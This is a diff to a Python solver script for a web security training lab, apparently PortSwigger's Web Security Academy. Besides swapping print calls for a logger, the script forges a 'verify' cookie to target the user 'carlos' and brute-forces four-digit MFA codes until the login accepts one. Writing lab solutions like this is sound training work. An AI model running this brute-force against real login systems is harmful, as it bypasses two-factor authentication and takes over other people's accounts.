@@ -1,4 +1,4 @@
-from web_security_academy.core.utils import *
+from web_security_academy.core.logger import logger
 from bs4 import BeautifulSoup
 
 
@@ -8,22 +8,24 @@ def solve_lab(session):
     # to log in as carlos. From there we can brute-force the security code.
 
     session.cookies.set("verify", "carlos")
-    print_info(
+    logger.info(
         'Generating a security code for "carlos" by visiting "/login2" with the following cookies:'
     )
-    print(session.cookies.get_dict(), end="\n\n")
+    logger.info(session.cookies.get_dict())
     session.get_path("/login2")
 
-    print_info("Brute-forcing the security code... (Range: 0000 - 1999)")
+    logger.info("Brute-forcing the security code... (Range: 0000 - 1999)")
+    logger.toggle_newline()
     for i in range(2000):
         data = {"mfa-code": f"{i:04d}"}
         resp = session.post_path("/login2", data=data, allow_redirects=False)
 
         if resp.status_code != 302:
-            print_info_secondary(f"{i:04d} => Incorrect", end="\x1b[1K")
+            logger.info(f"{i:04d} => Incorrect")
         else:
-            print_success(f"{i:04d} => Correct!\n")
+            logger.success(f"{i:04d} => Correct!")
             session.post_path("/login2", data=data)
             break
     else:
-        print_fail("Unable to brute-force security code.")
+        logger.failure("Unable to brute-force security code.")
+    logger.toggle_newline()
